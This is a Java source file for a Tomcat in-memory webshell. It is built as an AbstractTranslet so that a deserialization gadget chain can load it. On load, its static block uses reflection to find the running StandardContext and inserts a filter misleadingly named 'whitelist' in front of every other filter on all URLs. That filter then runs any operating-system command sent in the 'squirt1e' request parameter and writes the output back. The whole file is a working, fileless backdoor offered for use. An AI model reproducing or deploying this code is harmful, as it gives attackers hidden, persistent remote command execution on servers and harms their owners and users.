package gadget.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import static gadget.memshell.TomcatShellInject.getServletContext;

/**
 * @author squirt1e
 * @support version tomcat 7,8,9
 */
public class TomcatShellInject2 extends AbstractTranslet implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "squirt1e";
    /**
     * 建议针对相应业务去修改filter过滤的url pattern
     */
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "whitelist";


    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    static  {
        try {
            try {
                StandardContext standardContext = getServletContext();
                System.out.println(standardContext);
                Field field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                if(map.get(filterName) == null){
                    System.out.println("[+] Add Dynamic Filter");

                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try{
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    }catch(ClassNotFoundException e){
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }

                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
                    Filter filter = new TomcatShellInject2();

                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try{
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    }catch (ClassNotFoundException e){
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }

                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{filterUrlPattern});
                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                    map.put(filterName, filterConfig);
                }
            }catch(Exception e){
                e.printStackTrace();
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }


    static StandardContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        String uri = null;
        String serverName = null;
        Object object;
        for (Thread thread : threads) {

            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                // 不是对应的请求时，serverPort = -1
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                serverName = (String) getField(serverNameMB, "strValue");
                if (serverName == null) {
                    serverName = serverNameMB.toString();
                }
                if (serverName == null) {
                    serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                uri = (String) getField(uriMB, "strValue");
                if (uri == null) {
                    uri = uriMB.toString();
                }
                if (uri == null) {
                    uri = uriMB.getString();
                }
            }
        }
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                }catch (Exception e){}
                if (jioEndPoint == null){
                    try{
                        jioEndPoint = getField(target, "endpoint");
                    }catch (Exception e){ return null; }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                }catch (Exception e){}
                if (engine == null){
                    engine = (StandardEngine) getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                System.out.println(children);
//                System.out.println(uri);
                StandardHost standardHost = (StandardHost) children.get(serverName);

                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(uri.startsWith(contextKey))){continue;}
                    StandardContext standardContext = (StandardContext) children.get(contextKey);
//                    this.standardContext = standardContext;
                    return standardContext;
                }
            }
        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
